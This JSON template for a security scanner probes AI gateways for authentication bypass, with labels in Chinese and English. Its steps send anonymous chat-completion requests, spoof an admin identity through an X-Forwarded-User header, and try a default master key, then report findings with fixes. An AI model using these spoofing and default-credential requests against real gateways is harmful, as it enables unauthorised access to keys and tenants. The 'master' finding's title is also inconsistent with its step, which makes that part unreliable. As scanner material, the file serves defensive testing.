{
  "schema": "inkblade-probe-template-v1",
  "key": "aigateway-auth-bypass",
  "version": "1.0.0",
  "meta": {
    "name": {
      "zh": "AI 网关鉴权绕过（默认凭据 / 伪造身份头）",
      "en": "AI Gateway Auth Bypass (default credential / forged identity header)"
    },
    "series": "横向利用",
    "min_level": "利用验证",
    "writes": false,
    "requires": [],
    "surfaces": [],
    "cves": [],
    "fidelity": "equivalent"
  },
  "inputs": {
    "target": {
      "from": "params.target",
      "required": true
    }
  },
  "defaults": {
    "timeout_ms": 8000,
    "tls_verify": false
  },
  "payloads": {
    "benign": {
      "marker": "INKBLADE-BENIGN"
    },
    "attack": {
      "marker": "{{ctx.marker}}",
      "note": "lab-only probe"
    }
  },
  "limits": {
    "timeout_ms": 30000,
    "max_http_requests": 24
  },
  "computed": {
    "anon_ok": "steps.anon.status == 200",
    "spoof_global": "steps.spoof.status == 200 and steps.spoof.json.scope == 'global'",
    "master_ok": "steps.master.status == 200 and steps.master.json.scope == 'global'"
  },
  "steps": [
    {
      "id": "anon",
      "op": "http",
      "method": "POST",
      "url": "{{input.target}}/v1/chat/completions",
      "body": {
        "model": "gpt-4o",
        "messages": [
          {
            "role": "user",
            "content": "INKBLADE-BENIGN probe"
          }
        ],
        "max_tokens": 8
      },
      "save": "anon",
      "allow_failure": true
    },
    {
      "id": "spoof",
      "op": "http",
      "method": "GET",
      "url": "{{input.target}}/key/info",
      "headers": {
        "X-Forwarded-User": "admin",
        "X-Tenant": "tenant-b"
      },
      "save": "spoof",
      "allow_failure": true
    },
    {
      "id": "master",
      "op": "http",
      "method": "POST",
      "url": "{{input.target}}/v1/chat/completions",
      "body": {
        "model": "gpt-4o",
        "messages": [
          {
            "role": "user",
            "content": "INKBLADE-BENIGN probe"
          }
        ],
        "max_tokens": 8
      },
      "headers": {
        "Authorization": "Bearer MOCK-master-key-4c7a"
      },
      "save": "master",
      "allow_failure": true
    }
  ],
  "findings": [
    {
      "id": "anon",
      "when": "computed.anon_ok",
      "sev": "high",
      "title": "AI 网关未授权对话：匿名调用 /v1/chat/completions",
      "detail": "status={{steps.anon.status}} model={{steps.anon.json.model}} — 默认凭据/未启用鉴权",
      "evidence": "{{steps.anon.sha256}}",
      "mapping": "OWASP LLM01/ASI03",
      "fix": "所有推理路由强制 API key；禁用默认 master key"
    },
    {
      "id": "spoof",
      "when": "computed.spoof_global",
      "sev": "high",
      "title": "伪造 X-Forwarded-User 越权：/key/info 返回全局 key 清单",
      "detail": "subject={{steps.spoof.json.subject}} scope={{steps.spoof.json.scope}} visible={{str(steps.spoof.json.visible_tenants)}}",
      "evidence": "{{steps.spoof.sha256}}",
      "mapping": "CWE-290 身份伪造",
      "fix": "信任边界仅接受网关自身注入的身份头；外部请求剥离 X-Forwarded-*"
    },
    {
      "id": "master",
      "when": "computed.master_ok",
      "sev": "high",
      "title": "默认 master key 仍可用：/key/info 返回全局作用域",
      "detail": "status={{steps.master.status}} — 轮换 master key 并禁用默认值"
    },
    {
      "id": "clean",
      "when": "not computed.anon_ok and not computed.spoof_global",
      "sev": "info",
      "title": "鉴权基线正常：匿名调用与伪造身份均被拒绝",
      "detail": "anon={{steps.anon.status}} spoof={{steps.spoof.status}} master={{steps.master.status}}"
    }
  ],
  "artifacts": [
    {
      "name": "aigateway-auth-bypass.json",
      "kind": "json",
      "fields": {
        "anon_status": "steps.anon.status",
        "spoof_scope": "steps.spoof.json.scope",
        "master_scope": "steps.master.json.scope",
        "route": "'/v1/chat/completions'"
      }
    }
  ]
}
